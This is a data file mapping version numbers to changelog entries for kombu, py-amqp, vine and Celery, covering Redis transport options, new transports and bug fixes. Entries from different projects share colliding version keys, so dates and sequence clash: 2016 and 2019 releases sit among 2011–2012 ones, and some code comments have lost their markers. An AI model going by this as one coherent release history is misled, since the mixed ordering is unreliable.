implemented by storing a copy of the message when the message\n    is consumed.  The copy is not removed until the consumer acknowledges\n    or rejects it.\n\n    This means that unacknowledged messages will be redelivered either\n    when the connection is closed, or when the visibility timeout is exceeded.\n\n    - Visibility timeout\n\n        This is a timeout for acks, so that if the consumer\n        does not ack the message within this time limit, the message\n        is redelivered to another consumer.\n\n        The timeout is set to one hour by default, but\n        can be changed by configuring a transport option:\n\n            >>> Connection('redis://', transport_options={\n            ...     'visibility_timeout': 1800,   30 minutes\n            ... })\n\n    **NOTE**: Messages that have not been acked will be redelivered\n    if the visibility timeout is exceeded, for Celery users\n    this means that ETA/countdown tasks that are scheduled to execute\n    with a time that exceeds the visibility timeout will be executed\n    twice (or more).  If you plan on using long ETA/countdowns you\n    should tweak the visibility timeout accordingly:\n\n    .. code-block:: python\n\n        BROKER_TRANSPORT_OPTIONS = {'visibility_timeout': 18000}   5 hours\n\n    Setting a long timeout means that it will take a long time\n    for messages to be redelivered in the event of a power failure,\n    but if so happens you could temporarily set the visibility timeout lower\n    to flush out messages when you start up the systems again.\n\n- Experimental `Apache ZooKeeper`_ transport\n\n    More information is in the module reference:\n    :mod:`kombu.transport.zookeeper`.\n\n    Contributed by Mahendra M.\n\n.. _`Apache ZooKeeper`: http://zookeeper.apache.org/\n\n- Redis: Priority support.\n\n    The message's ``priority`` field is now respected by the Redis\n    transport by having multiple lists for each named queue.\n    The queues are then consumed by in order of priority.\n\n    The priority field is a number in the range of 0 - 9, where\n    0 is the default and highest priority.\n\n    The priority range is collapsed into four steps by default, since it is\n    unlikely that nine steps will yield more benefit than using four steps.\n    The number of steps can be configured by setting the ``priority_steps``\n    transport option, which must be a list of numbers in **sorted order**:\n\n    .. code-block:: pycon\n\n        >>> x = Connection('redis://', transport_options={\n        ...     'priority_steps': [0, 2, 4, 6, 8, 9],\n        ... })\n\n    Priorities implemented in this way is not as reliable as\n    priorities on the server side, which is why\n    nickname the feature \"quasi-priorities\";\n    **Using routing is still the suggested way of ensuring\n    quality of service**, as client implemented priorities\n    fall short in a number of ways, e.g. if the worker\n    is busy with long running tasks, has prefetched many messages,\n    or the queues are congested.\n\n    Still, it is possible that using priorities in combination\n    with routing can be more beneficial than using routing\n    or priorities alone.  Experimentation and monitoring\n    should be used to prove this.\n\n    Contributed by Germ\u00e1n M. Bravo.\n\n- Redis: Now cycles queues so that consuming is fair.\n\n    This ensures that a very busy queue won't block messages\n    from other queues, and ensures that all queues have\n    an equal chance of being consumed from.\n\n    This used to be the case before, but the behavior was\n    accidentally changed while switching to using blocking pop.\n\n- Redis: Auto delete queues that are bound to fanout exchanges\n  is now deleted at channel.close.\n\n- amqplib: Refactored the drain_events implementation.\n\n- Pidbox: Now uses ``connection.default_channel``.\n\n- Pickle serialization: Can now decode buffer objects.\n\n- Exchange/Queue declarations can now be cached even if\n  the entity is non-durable.\n\n    This is possible because the list of cached declarations\n    are now kept with the connection, so that the entities\n    will be redeclared if the connection is lost.\n\n- Kombu source code now only uses one-level of explicit relative imports.\n\n.. _v220-fixes:\n\nFixes\n-----\n\n- eventio: Now ignores ENOENT raised by ``epoll.register``, and\n  EEXIST from ``epoll.unregister``.\n\n- eventio: kqueue now ignores :exc:`KeyError` on unregister.\n\n- Redis: ``Message.reject`` now supports the ``requeue`` argument.\n\n- Redis: Remove superfluous pipeline call.\n\n    Fix contributed by Thomas Johansson.\n\n- Redis: Now sets redelivered header for redelivered messages.\n\n- Now always makes sure references to :func:`sys.exc_info` is removed.\n\n- Virtual: The compression header is now removed before restoring messages.\n\n- More tests for the SQLAlchemy backend.\n\n    Contributed by Franck Cuny.\n\n- Url parsing did not handle MongoDB URLs properly.\n\n    Fix contributed by Flavio Percoco Premoli.\n\n- Beanstalk: Ignore default tube when reserving.\n\n    Fix contributed by Zhao Xiaohong.\n\nNonblocking consume support\n---------------------------\n\nlibrabbitmq, amqplib and redis transports can now be used\nnon-blocking.\n\nThe interface is very manual, and only consuming messages\nis non-blocking so far.\n\nThe API should not be regarded as stable or final\nin any way. It is used by Celery which has very limited\nneeds at this point. Hopefully we can introduce a proper\ncallback-based API later.\n\n- ``Transport.eventmap``\n\n    Is a map of ``fd -> callback(fileno, event)``\n    to register in an eventloop.\n\n- ``Transport.on_poll_start()``\n\n    Is called before every call to poll.\n    The poller must support ``register(fd, callback)``\n    and ``unregister(fd)`` methods.\n\n- ``Transport.on_poll_start(poller)``\n\n    Called when the hub is initialized.\n    The poller argument must support the same\n    interface as :class:`kombu.utils.eventio.poll`.\n\n- ``Connection.ensure_connection`` now takes a callback\n  argument which is called for every loop while\n  the connection is down.\n\n- Adds ``connection.drain_nowait``\n\n    This is a non-blocking alternative to drain_events,\n    but only supported by amqplib/librabbitmq.\n\n- drain_events now sets ``connection.more_to_read`` if\n  there is more data to read.\n\n    This is to support eventloops where other things\n    must be handled between draining events.\n\n.. _version-2.1.8:\n\n", "2.1.4": "=====\n:release-date: 2012-04-03 04:00 P.M GMT\n:release-by: Ask Solem\n\n* MongoDB:  URL parsing are now delegated to the pymongo library\n  (Fixes Issue 103 and Issue 87).\n\n    Fix contributed by Flavio Percoco Premoli and James Sullivan\n\n* SQS:  A bug caused SimpleDB to be used even if sdb persistence\n  was not enabled (Issue 108).\n\n    Fix contributed by Anand Kumria.\n\n* Django:  Transaction was committed in the wrong place, causing\n  data cleanup to fail (Issue 115).\n\n    Fix contributed by Daisuke Fujiwara.\n\n* MongoDB: Now supports replica set URLs.\n\n    Contributed by Flavio Percoco Premoli.\n\n* Redis: Now raises a channel error if a queue key that is currently\n  being consumed from disappears.\n\n    Fix contributed by Stephan Jaekel.\n\n* All transport 'channel_errors' lists now includes\n  ``kombu.exception.StdChannelError``.\n\n* All kombu exceptions now inherit from a common\n  :exc:`~kombu.exceptions.KombuError`.\n\n.. _version-2.1.3:\n\n", "2.1.3": "=====\n:release-date: 2012-03-20 03:00 P.M GMT\n:release-by: Ask Solem\n\n* Fixes Jython compatibility issues.\n\n* Fixes Python 2.5 compatibility issues.\n\n.. _version-2.1.2:\n\n", "2.1.2": "=====\n:release-date: 2012-03-01 01:00 P.M GMT\n:release-by: Ask Solem\n\n* amqplib: Last version broke SSL support.\n\n.. _version-2.1.1:\n\n", "2.1.1": "=====\n:release-date: 2012-02-24 02:00 P.M GMT\n:release-by: Ask Solem\n\n* Connection URLs now supports encoded characters.\n\n* Fixed a case where connection pool could not recover from connection loss.\n\n    Fix contributed by Florian Munz.\n\n* We now patch amqplib's ``__del__`` method to skip trying to close the socket\n  if it is not connected, as this resulted in an annoying warning.\n\n* Compression can now be used with binary message payloads.\n\n    Fix contributed by Steeve Morin.\n\n.. _version-2.1.0:\n\n", "2.1.0": "=====\n:release-date: 2012-02-04 10:38 P.M GMT\n:release-by: Ask Solem\n\n* MongoDB: Now supports fanout (broadcast) (Issue 98).\n\n    Contributed by Scott Lyons.\n\n* amqplib: Now detects broken connections by using ``MSG_PEEK``.\n\n* pylibrabbitmq: Now supports ``basic_get`` (Issue 97).\n\n* gevent: Now always uses the ``select`` polling backend.\n\n* pika transport: Now works with pika 0.9.5 and 0.9.6dev.\n\n    The old pika transport (supporting 0.5.x) is now available\n    as alias ``oldpika``.\n\n    (Note terribly latency has been experienced with the new pika\n    versions, so this is still an experimental transport).\n\n* Virtual transports: can now set polling interval via the\n  transport options (Issue 96).\n\n    Example:\n\n    .. code-block:: pycon\n\n        >>> Connection('sqs://', transport_options={\n        ...     'polling_interval': 5.0})\n\n    The default interval is transport specific, but usually\n    1.0s (or 5.0s for the Django database transport, which\n    can also be set using the ``KOMBU_POLLING_INTERVAL`` setting).\n\n* Adds convenience function: :func:`kombu.common.eventloop`.\n\n.. _version-2.0.0:\n\n", "2.0.3": "=====\n:release-date: 2016-07-11 08:00 P.M PDT\n:release-by: Ask Solem\n\n- SSLTransport: Fixed crash \"no attribute sslopts\" when ``ssl=True``\n  (Issue 100).\n\n- Fixed incompatible argument spec for ``Connection.Close`` (Issue 45).\n\n    This caused the RabbitMQ server to raise an exception (INTERNAL ERROR).\n\n- Transport: No longer implements `__del__` to make sure gc can collect\n  connections.\n\n    It's the responsibility of the caller to close connections, this was\n    simply a relic from the amqplib library.\n\n.. _version-2.0.2:\n\n", "2.0.2": "=====\n:release-date: 2016-06-10 5:40 P.M PDT\n:release-by: Ask Solem\n\n- Python 3: Installation requirements ended up being a generator\n  and crashed setup.py.\n\n    Fix contributed by ChangBo Guo(gcb).\n\n- Python <= 2.7.7: struct.pack arguments cannot be unicode\n\n    Fix contributed by Alan Justino and Xin Li.\n\n- Python 3.4: Fixed use of `bytes % int`.\n\n    Fix contributed by Alan Justino.\n\n- Connection/Transport: Fixed handling of default port.\n\n    Fix contributed by Quentin Pradet.\n\n.. _version-2.0.1:\n\n", "2.0.1": "=====\n:release-date: 2016-05-31 6:20 P.M PDT\n:release-by: Ask Solem\n\n- Adds backward compatibility layer for the 1.4 API.\n\n    Using the connection without calling ``.connect()`` first will now work,\n    but a warning is emitted and the behavior is deprecated and will be\n    removed in version 2.2.\n\n- Fixes kombu 3.0/celery 3.1 compatibility (Issue 88).\n\n    Fix contributed by Bas ten Berge.\n\n- Fixed compatibility with Python 2.7.3 (Issue 85)\n\n    Fix contributed by Bas ten Berge.\n\n- Fixed bug where calling drain_events() with a timeout of 0 would actually\n  block until a frame is received.\n\n- Documentation moved to http://amqp.readthedocs.io (Issue #89).\n\n    See https://blog.readthedocs.com/securing-subdomains/ for the reasoning\n    behind this change.\n\n    Fix contributed by Adam Chainz.\n\n.. _version-2.0.0:\n\n", "2.0.0": "=====\n:release-date: 2012-01-15 06:34 P.M GMT\n:release-by: Ask Solem\n\n.. _v200-important:\n\nImportant Notes\n---------------\n\n.. _v200-python-compatibility:\n\nPython Compatibility\n~~~~~~~~~~~~~~~~~~~~\n\n* No longer supports Python 2.4.\n\n    Users of Python 2.4 can still use the 1.x series.\n\n    The 1.x series has entered bugfix-only maintenance mode, and will\n    stay that way as long as there is demand, and a willingness to\n    maintain it.\n\n\n.. _v200-new-transports:\n\nNew Transports\n~~~~~~~~~~~~~~\n\n* ``django-kombu`` is now part of Kombu core.\n\n    The Django message transport uses the Django ORM to store messages.\n\n    It uses polling, with a default polling interval of 5 seconds.\n    The polling interval can be increased or decreased by configuring the\n    ``KOMBU_POLLING_INTERVAL`` Django setting, which is the polling\n    interval in seconds as an int or a float.  Note that shorter polling\n    intervals can cause extreme strain on the database: if responsiveness\n    is needed you shall consider switching to a non-polling transport.\n\n    To use it you must use transport alias ``\"django\"``,\n    or as a URL:\n\n    .. code-block:: text\n\n        django://\n\n    and then add ``kombu.transport.django`` to ``INSTALLED_APPS``, and\n    run ``manage.py syncdb`` to create the necessary database tables.\n\n    **Upgrading**\n\n    If you have previously used ``django-kombu``, then the entry\n    in ``INSTALLED_APPS`` must be changed from ``djkombu``\n    to ``kombu.transport.django``:\n\n    .. code-block:: python\n\n        INSTALLED_APPS = (\n             \u2026,\n            'kombu.transport.django',\n        )\n\n    If you have previously used django-kombu, then there is no need\n    to recreate the tables, as the old tables will be fully compatible\n    with the new version.\n\n* ``kombu-sqlalchemy`` is now part of Kombu core.\n\n    This change requires no code changes given that the\n    ``sqlalchemy`` transport alias is used.\n\n.. _v200-news:\n\nNews\n----\n\n* :class:`kombu.mixins.ConsumerMixin` is a mixin class that lets you\n  easily write consumer programs and threads.\n\n  See :ref:`examples` and :ref:`guide-consumers`.\n\n* SQS Transport: Added support for SQS queue prefixes (Issue 84).\n\n    The queue prefix can be set using the transport option\n    ``queue_name_prefix``:\n\n    .. code-block:: python\n\n        BrokerTransport('SQS://', transport_options={\n            'queue_name_prefix': 'myapp'})\n\n    Contributed by Nitzan Miron.\n\n* ``Producer.publish`` now supports automatic retry.\n\n    Retry is enabled by the ``reply`` argument, and retry options\n    set by the ``retry_policy`` argument:\n\n    .. code-block:: python\n\n        exchange = Exchange('foo')\n        producer.publish(message, exchange=exchange, retry=True,\n                         declare=[exchange], retry_policy={\n                            'interval_start': 1.0})\n\n    See :meth:`~kombu.Connection.ensure`\n    for a list of supported retry policy options.\n\n* ``Producer.publish`` now supports a ``declare`` keyword argument.\n\n    This is a list of entities (:class:`Exchange`, or :class:`Queue`)\n    that should be declared before the message is published.\n\n.. _v200-fixes:\n\nFixes\n-----\n\n* Redis transport: Timeout was multiplied by 1000 seconds when using\n  ``select`` for event I/O (Issue 86).\n\n.. _version-1.5.1:\n\n", "1.4.9": "=====\n:release-date: 2016-01-08 5:50 P.M PST\n:release-by: Ask Solem\n\n- Fixes compatibility with Linux/macOS instances where the ``ctypes`` module\n  does not exist.\n\n    Fix contributed by Jared Lewis.\n\n.. _version-1.4.8:\n\n", "1.4.8": "=====\n:release-date: 2015-12-07 12:25 A.M\n:release-by: Ask Solem\n\n- ``abstract_channel.wait`` now accepts a float `timeout` parameter expressed\n    in seconds\n\n    Contributed by Goir.\n\n.. _version-1.4.7:\n\n", "1.4.7": "=====\n:release-date: 2015-10-02 05:30 P.M PDT\n:release-by: Ask Solem\n\n- Fixed libSystem error on macOS 10.11 (El Capitan)\n\n    Fix contributed by Eric Wang.\n\n- ``channel.basic_publish`` now raises :exc:`amqp.exceptions.NotConfirmed` on\n    ``basic.nack``.\n\n- AMQP timestamps received are now converted from GMT instead of local time\n    (Issue 67).\n\n- Wheel package installation now supported by both Python 2 and Python3.\n\n    Fix contributed by R\u00e9my Greinhofer.\n\n.. _version-1.4.6:\n\n", "1.4.6": "=====\n:release-date: 2014-08-11 06:00 P.M UTC\n:release-by: Ask Solem\n\n- Now keeps buffer when socket times out.\n\n    Fix contributed by Artyom Koval.\n\n- Adds ``Connection.Transport`` attribute that can be used to specify\n  a different transport implementation.\n\n    Contributed by Yury Selivanov.\n\n.. _version-1.4.5:\n\n", "1.4.5": "=====\n:release-date: 2014-04-15 09:00 P.M UTC\n:release-by: Ask Solem\n\n- Can now deserialize more AMQP types.\n\n    Now handles types ``short string``, ``short short int``,\n    ``short short unsigned int``, ``short int``,  ``short unsigned int``,\n    ``long unsigned int``,  ``long long int``, ``long long unsigned int``\n    and ``float`` which for some reason was missing, even in the original\n    amqplib module.\n\n- SSL: Workaround for Python SSL bug.\n\n    A bug in the python socket library causes ``ssl.read/write()``\n    on a closed socket to raise :exc:`AttributeError` instead of\n    :exc:`IOError`.\n\n    Fix contributed by Craig Jellick.\n\n- ``Transport.__del_`` now handles errors occurring at late interpreter\n  shutdown (Issue 36).\n\n.. _version-1.4.4:\n\n", "1.4.4": "=====\n:release-date: 2014-03-03 04:00 P.M UTC\n:release-by: Ask Solem\n\n- SSL transport accidentally disconnected after read timeout.\n\n    Fix contributed by Craig Jellick.\n\n.. _version-1.4.3:\n\n", "1.4.3": "=====\n:release-date: 2011-10-27 10:00 P.M BST\n:release-by: Ask Solem\n\n* Fixes bug in ProducerPool where too many resources would be acquired.\n\n.. _version-1.4.2:\n\n", "1.4.2": "=====\n:release-date: 2011-10-26 05:00 P.M BST\n:release-by: Ask Solem\n\n* Eventio: Polling should ignore `errno.EINTR`\n\n* SQS: str.encode did only start accepting kwargs after Py2.7.\n\n* simple_task_queue example didn't run correctly (Issue 72).\n\n    Fix contributed by Stefan Eletzhofer.\n\n* Empty messages would not raise an exception not able to be handled\n  by `on_decode_error` (Issue 72)\n\n    Fix contributed by Christophe Chauvet.\n\n* CouchDB: Properly authenticate if user/password set (Issue 70)\n\n    Fix contributed by Rafael Duran Castaneda\n\n* Connection.Consumer had the wrong signature.\n\n    Fix contributed by Pavel Skvazh\n\n.. _version-1.4.1:\n\n", "1.4.1": "=====\n:release-date: 2011-09-26 04:00 P.M BST\n:release-by: Ask Solem\n\n* 1.4.0 broke the producer pool, resulting in new connections being\n  established for every acquire.\n\n\n.. _version-1.4.0:\n\n", "1.4.0": "=====\n:release-date: 2011-09-22 05:00 P.M BST\n:release-by: Ask Solem\n\n* Adds module :mod:`kombu.mixins`.\n\n    This module contains a :class:`~kombu.mixins.ConsumerMixin` class\n    that can be used to easily implement a message consumer\n    thread that consumes messages from one or more\n    :class:`kombu.Consumer` instances.\n\n* New example: :ref:`task-queue-example`\n\n    Using the ``ConsumerMixin``, default channels and\n    the global connection pool to demonstrate new Kombu features.\n\n* MongoDB transport did not work with MongoDB >= 2.0 (Issue 66)\n\n    Fix contributed by James Turk.\n\n* Redis-py version check did not account for beta identifiers\n  in version string.\n\n    Fix contributed by David Ziegler.\n\n* Producer and Consumer now accepts a connection instance as the\n  first argument.\n\n    The connections default channel will then be used.\n\n    In addition shortcut methods has been added to Connection:\n\n    .. code-block:: pycon\n\n        >>> connection.Producer(exchange)\n        >>> connection.Consumer(queues=..., callbacks=...)\n\n* Connection has aquired a ``connected`` attribute that\n  can be used to check if the connection instance has established\n  a connection.\n\n* ``ConnectionPool.acquire_channel`` now returns the connections\n  default channel rather than establising a new channel that\n  must be manually handled.\n\n* Added ``kombu.common.maybe_declare``\n\n    ``maybe_declare(entity)`` declares an entity if it has\n    not previously been declared in the same process.\n\n* :func:`kombu.compat.entry_to_queue` has been moved to :mod:`kombu.common`\n\n* New module :mod:`kombu.clocks` now contains an implementation\n  of Lamports logical clock.\n\n.. _version-1.3.5:\n\n", "1.3.3": "=====\n:release-date: 2011-09-15 02:00 P.M BST\n:release-by: Ask Solem\n\n* pools.reset did not support after forker arguments.\n\n.. _version-1.3.2:\n\n", "1.3.2": "=====\n:release-date: 2011-09-10 01:00 P.M BST\n:release-by: Mher Movsisyan\n\n* Broke Python 2.5 compatibility by importing ``parse_qsl`` from ``urlparse``\n\n* Connection.default_channel is now closed when connection is revived\n  after connection failures.\n\n* Pika: Channel now supports the ``connection.client`` attribute\n  as required by the simple interface.\n\n* pools.set_limit now raises an exception if the limit is lower\n  than the previous limit.\n\n* pools.set_limit no longer resets the pools.\n\n.. _version-1.3.1:\n\n", "1.3.1": "=====\n:release-date: 2011-10-07 03:00 P.M BST\n:release-by: Ask Solem\n\n* Last release broke after fork for pool reinitialization.\n\n* Producer/Consumer now has a ``connection`` attribute,\n  giving access to the :class:`Connection` of the\n  instance.\n\n* Pika: Channels now have access to the underlying\n  :class:`Connection` instance using ``channel.connection.client``.\n\n    This was previously required by the ``Simple`` classes and is now\n    also required by :class:`Consumer` and :class:`Producer`.\n\n* Connection.default_channel is now closed at object revival.\n\n* Adds kombu.clocks.LamportClock.\n\n* compat.entry_to_queue has been moved to new module :mod:`kombu.common`.\n\n.. _version-1.3.0:\n\n", "1.3.0": "=====\n:release-date: 2019-03-19 11:00 A.M UTC+2\n:release-by: Omer Katz\n\n- Added the option to ignore the result of a function and simply\n  call the callback without arguments.\n\n  Contributed by **Omer Katz**\n\n.. _version-1.2.0:\n\n", "1.2.1": "=====\n:release-date: 2011-07-29 12:52 P.M BST\n:release-by: Ask Solem\n\n* Now depends on amqplib >= 1.0.0.\n\n* Redis: Now automatically deletes auto_delete queues at ``basic_cancel``.\n\n* ``serialization.unregister`` added so it is possible to remove unwanted\n  seralizers.\n\n* Fixes MemoryError while importing ctypes on SELinux (Issue 52).\n\n* ``Connection.autoretry`` is a version of ``ensure`` that works\n  with arbitrary functions (i.e. it does not need an associated object\n  that implements the ``revive`` method.\n\n  Example usage:\n\n  .. code-block:: python\n\n        channel = connection.channel()\n        try:\n            ret, channel = connection.autoretry(send_messages, channel=channel)\n        finally:\n            channel.close()\n\n* ``ConnectionPool.acquire`` no longer force establishes the connection.\n\n    The connection will be established as needed.\n\n* ``Connection.ensure`` now supports an ``on_revive`` callback\n  that is applied whenever the connection is re-established.\n\n* ``Consumer.consuming_from(queue)`` returns True if the Consumer is\n  consuming from ``queue``.\n\n* ``Consumer.cancel_by_queue`` did not remove the queue from ``queues``.\n\n* ``compat.ConsumerSet.add_queue_from_dict`` now automatically declared\n  the queue if ``auto_declare`` set.\n\n.. _version-1.2.0:\n\n", "1.2.0": "=====\n:release-date: 2018-01-06 4:30 P.M UTC+2\n:release-by: Omer Katz\n\n- Added Python 3.7 support.\n\n  Contributed by **Jon Dufresne** & **:github_user:`dequis`**\n\n- Handle bound methods in weak reference promise instances.\n\n  Contributed by **George Psarakis**\n\nDocumentation fixes, CI adjustments and cleanups by:\n\n- **Omer Katz**\n- **Jon Dufresne**\n- **Edward Betts**\n- **Jacopo Notarstefano**\n- **Christopher Hoskin**\n- **Fahad Siddiqui**\n\n.. _version-1.1.4:\n\n", "1.1.0": "=====\n:release-date: 2016-04-21 01:30 P.M PDT\n:release-by: Ask Solem\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now passes partial\n  args/kwargs to the errback:\n\n    .. code-block:: pycon\n\n        >>> p = promise(args=(self,), on_error=handle_error)\n        >>> p.throw(exc)   --> handle_error(self, exc)\n\n- New :class:`vine.abstract.ThenableProxy` can be used to add\n  promise-capabilities to a class by forwarding to a different promise.\n\n    .. code-block:: python\n\n        from vine import promise\n        from vine.abstract import ThenableProxy\n\n        class P(ThenableProxy):\n\n            def __init__(self, on_success=None, on_error=None):\n                self._set_promise_target(promise(\n                    args=(self,), callback=on_success, on_error=on_error,\n                ))\n\n        p = P()\n        p.then(download_file(url)).then(extract_file)\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now supports a propagate\n  argument that can be set to False to never reraise the exception.\n\n- :meth:`promise.throw() <vine.promises.promise.throw>` now also reraises the\n  current exception from the stack, if the exc argument is passed and that\n  value is the same as the current exception.\n\n- :meth:`Thenable.register() <vine.abstract.Thenable.register>` can now be\n  used as a decorator.\n\n- Argument to :meth:`promise.throw1(exc) <vine.promises.promise.throw1>` can now be\n  :const:`None` to use the current exception.\n\n- ``monotonic()`` now uses ``librt.so.0`` as an alternative if ``librt.so.1``\n  does not exist.\n\n    Contributed by Fahad Siddiqui.\n\n.. _version-1.0.2:\n\n", "1.0.13": "======\n:release-date: 2013-07-31 04:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed problems with the SSL transport (Issue 15).\n\n    Fix contributed by Adrien Guinet.\n\n- Small optimizations\n\n.. _version-1.0.12:\n\n", "1.0.12": "======\n:release-date: 2013-06-25 02:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed another Python 3 compatibility problem.\n\n.. _version-1.0.11:\n\n", "1.0.11": "======\n:release-date: 2013-04-11 06:00 P.M BST\n:release-by: Ask Solem\n\n- Fixed Python 3 incompatibility in ``amqp/transport.py``.\n\n.. _version-1.0.10:\n\n", "1.0.10": "======\n:release-date: 2013-03-21 03:30 P.M UTC\n:release-by: Ask Solem\n\n- Fixed Python 3 incompatibility in ``amqp/serialization.py``.\n  (Issue 11).\n\n.. _version-1.0.9:\n\n", "1.0.9": "=====\n:release-date: 2013-03-08 10:40 A.M UTC\n:release-by: Ask Solem\n\n- Publisher ack callbacks should now work after typo fix (Issue 9).\n\n- ``channel(explicit_id)`` will now claim that id from the array\n  of unused channel ids.\n\n- Fixes Jython compatibility.\n\n.. _version-1.0.8:\n\n", "1.0.8": "=====\n:release-date: 2013-02-08 01:00 P.M UTC\n:release-by: Ask Solem\n\n- Fixed SyntaxError on Python 2.5\n\n.. _version-1.0.7:\n\n", "1.0.7": "=====\n:release-date: 2011-03-28 05:45 P.M CEST\n:release-by: Ask Solem\n\n* Now depends on anyjson 0.3.1\n\n    cjson is no longer a recommended json implementation, and anyjson\n    will now emit a deprecation warning if used.\n\n* Please note that the Pika backend only works with version 0.5.2.\n\n    The latest version (0.9.x) drastically changed API, and it is not\n    compatible yet.\n\n* on_decode_error is now called for exceptions in message_to_python\n  (Issue 24).\n\n* Redis: did not respect QoS settings.\n\n* Redis: Creating a connection now ensures the connection is established.\n\n    This means ``Connection.ensure_connection`` works properly with\n    Redis.\n\n* consumer_tag argument to ``Queue.consume`` can't be :const:`None`\n  (Issue 21).\n\n    A None value is now automatically converted to empty string.\n    An empty string will make the server generate a unique tag.\n\n* Connection now supports a ``transport_options`` argument.\n\n    This can be used to pass additional arguments to transports.\n\n* Pika: ``drain_events`` raised :exc:`socket.timeout` even if no timeout\n  set (Issue 8).\n\n.. version-1.0.6:\n\n", "1.0.6": "=====\n:release-date: 2011-03-22 04:00 P.M CET\n:release-by: Ask Solem\n\n* The ``delivery_mode`` aliases (persistent/transient) were not automatically\n  converted to integer, and would cause a crash if using the amqplib\n  transport.\n\n* Redis: The redis-py :exc:`InvalidData` exception suddenly changed name to\n  :exc:`DataError`.\n\n* The :envvar:`KOMBU_LOG_DEBUG` environment variable can now be set to log all\n  channel method calls.\n\n  Support for the following environment variables have been added:\n\n    * :envvar:`KOMBU_LOG_CHANNEL` will wrap channels in an object that\n      logs every method call.\n\n    * :envvar:`KOMBU_LOG_DEBUG` both enables channel logging and configures the\n      root logger to emit messages to standard error.\n\n    **Example Usage**:\n\n    .. code-block:: console\n\n        $ KOMBU_LOG_DEBUG=1 python\n        >>> from kombu import Connection\n        >>> conn = Connection()\n        >>> channel = conn.channel()\n        Start from server, version: 8.0, properties:\n            {u'product': 'RabbitMQ',..............  }\n        Open OK! known_hosts []\n        using channel_id: 1\n        Channel open\n        >>> channel.queue_declare('myq', passive=True)\n        [Kombu channel:1] queue_declare('myq', passive=True)\n        (u'myq', 0, 1)\n\n.. _version-1.0.5:\n\n", "1.0.5": "=====\n:release-date: 2011-03-17 04:00 P.M CET\n:release-by: Ask Solem\n\n* Fixed memory leak when creating virtual channels.  All virtual transports\n  affected (redis, mongodb, memory, django, sqlalchemy, couchdb, beanstalk).\n\n* Virtual Transports: Fixed potential race condition when acking messages.\n\n    If you have been affected by this, the error would show itself as an\n    exception raised by the OrderedDict implementation. (``object no longer\n    exists``).\n\n* MongoDB transport requires the ``findandmodify`` command only available in\n  MongoDB 1.3+, so now raises an exception if connected to an incompatible\n  server version.\n\n* Virtual Transports: ``basic.cancel`` should not try to remove unknown\n  consumer tag.\n\n.. _version-1.0.4:\n\n", "1.0.4": "=====\n:release-date: 2011-02-28 04:00 P.M CET\n:release-by: Ask Solem\n\n* Added Transport.polling_interval\n\n    Used by django-kombu to increase the time to sleep between SELECTs when\n    there are no messages in the queue.\n\n    Users of django-kombu should upgrade to django-kombu v0.9.2.\n\n.. _version-1.0.3:\n\n", "1.0.3": "=====\n:release-date: 2011-02-12 04:00 P.M CET\n:release-by: Ask Solem\n\n* ConnectionPool: Re-connect if amqplib connection closed\n\n* Adds ``Queue.as_dict`` + ``Exchange.as_dict``.\n\n* Copyright headers updated to include 2011.\n\n.. _version-1.0.2:\n\n", "1.0.2": "=====\n:release-date: 2016-04-11 05:30 P.M PDT\n:release-by: Ask Solem\n\n- ``promise.throw()`` now supports second ``traceback`` argument to\n  throw exception with specific traceback.\n\n    Contributed by Ionel Cristian M\u0103rie\u0219.\n\n.. _version-1.0.1:\n\n", "1.0.1": "=====\n:release-date: 2016-04-11 03:00 P.M PDT\n:release-by: Ask Solem\n\n- Adds vine.five.python_2_unicode_compatible.\n\n.. _version-1.0.0:\n\n", "1.0.0": "=====\n:release-date: 2016-04-07 06:02 P.M PDT\n:release-by: Ask Solem\n\n- Initial release.\n\n\n Change log\n\n", "0.9.4": "=============\n\n- Adds support for ``exchange_bind`` and ``exchange_unbind``.\n\n    Contributed by Rumyana Neykova\n\n- Fixed bugs in funtests and demo scripts.\n\n    Contributed by Rumyana Neykova\n\n.. _version-0.9.3:\n\n", "0.9.3": "=============\n\n- Fixed bug that could cause the consumer to crash when reading\n  large message payloads asynchronously.\n\n- Serialization error messages now include the invalid value.\n\n.. _version-0.9.2:\n\n", "0.9.2": "=============\n\n- Consumer cancel notification support was broken (Issue 1)\n\n    Fix contributed by Andrew Grangaard\n\n.. _version-0.9.1:\n\n", "0.9.1": "=============\n\n- Supports draining events from multiple channels (``Connection.drain_events``)\n- Support for timeouts\n- Support for heartbeats\n    - ``Connection.heartbeat_tick(rate=2)`` must called at regular intervals\n      (half of the heartbeat value if rate is 2).\n    - Or some other scheme by using ``Connection.send_heartbeat``.\n- Supports RabbitMQ extensions:\n    - Consumer Cancel Notifications\n        - by default a cancel results in ``ChannelError`` being raised\n        - but not if a ``on_cancel`` callback is passed to ``basic_consume``.\n    - Publisher confirms\n        - ``Channel.confirm_select()`` enables publisher confirms.\n        - ``Channel.events['basic_ack'].append(my_callback)`` adds a callback\n          to be called when a message is confirmed. This callback is then\n          called with the signature ``(delivery_tag, multiple)``.\n- Support for ``basic_return``\n- Uses AMQP 0-9-1 instead of 0-8.\n    - ``Channel.access_request`` and ``ticket`` arguments to methods\n      **removed**.\n    - Supports the ``arguments`` argument to ``basic_consume``.\n    - ``internal`` argument to ``exchange_declare`` removed.\n    - ``auto_delete`` argument to ``exchange_declare`` deprecated\n    - ``insist`` argument to ``Connection`` removed.\n    - ``Channel.alerts`` has been removed.\n    - Support for ``Channel.basic_recover_async``.\n    - ``Channel.basic_recover`` deprecated.\n- Exceptions renamed to have idiomatic names:\n    - ``AMQPException`` -> ``AMQPError``\n    - ``AMQPConnectionException`` -> ConnectionError``\n    - ``AMQPChannelException`` -> ChannelError``\n    - ``Connection.known_hosts`` removed.\n    - ``Connection`` no longer supports redirects.\n    - ``exchange`` argument to ``queue_bind`` can now be empty\n      to use the \"default exchange\".\n- Adds ``Connection.is_alive`` that tries to detect\n  whether the connection can still be used.\n- Adds ``Connection.connection_errors`` and ``.channel_errors``,\n  a list of recoverable errors.\n- Exposes the underlying socket as ``Connection.sock``.\n- Adds ``Channel.no_ack_consumers`` to keep track of consumer tags\n  that set the no_ack flag.\n- Slightly better at error recovery\n\n\n.. _changelog:\n\n================\n Change history\n================\n\n.. _version-5.4.0rc3:\n\n", "5.4.0rc3": "========\n:release-date: 22 July, 2024\n:release-by: Tomer Nosrati\n\n- Fixed typo in Changelog for v5.4.0rc2 (2057)\n- Use logging.Logger.warning (2058)\n- Pin zstandard to latest version 0.23.0 (2060)\n- Update mypy to 1.11.0 